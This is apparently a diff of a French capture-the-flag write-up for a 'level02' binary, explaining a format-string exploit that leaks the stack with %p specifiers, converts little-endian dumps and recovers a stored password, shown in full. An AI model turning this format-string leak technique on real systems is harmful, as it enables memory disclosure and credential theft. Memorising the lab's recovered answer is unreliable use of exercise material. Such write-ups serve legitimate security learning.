@@ -1,3 +1,16 @@
+
+Dans cet exercice on va chercher a derouler la stack pour identifier ce qui est stocke dans la variable `buf_1`.
+
+On va utiliser un script pour convertir le code little-endian a big-endian.
+
+Le mot de passe quoi doit trouver est stocke a 2 emplacements memoire
+
+Reperer notre propre input en ecrivant `AAAA` a l'avant de notre input, puis %p %p %p ext.
+
+
+
+
+
 (perl -e '$word = 20;for ($count = $word; $count < $word + 8; $count +=1){    print("%$count\$p ");}pri
 nt("\n");' ; perl -e 'print "\n"' ; cat) | ./level02
 
@@ -7,6 +20,6 @@ nt("\n");' ; perl -e 'print "\n"' ; cat) | ./level02
 perl -e '$test=pack("H*", "756e505234376848"); @test2 = unpack("V*", $test); printf("%X %X ", @test2)'
 
 52506E75 48683734 354A4145 51397361 43717A37 58674E57 68354A35 7358476E 50673348 4D394B66
-RPnuHh745JAEQ9saCqz7XgNWh5J5sXGnPg3HM9Kf
+RPnu   Hh74   5JAE    Q9sa   Cqz7   XgNW   h5J5    sXGnPg3HM9Kf
 
 4868373452506e75 51397361354a4145
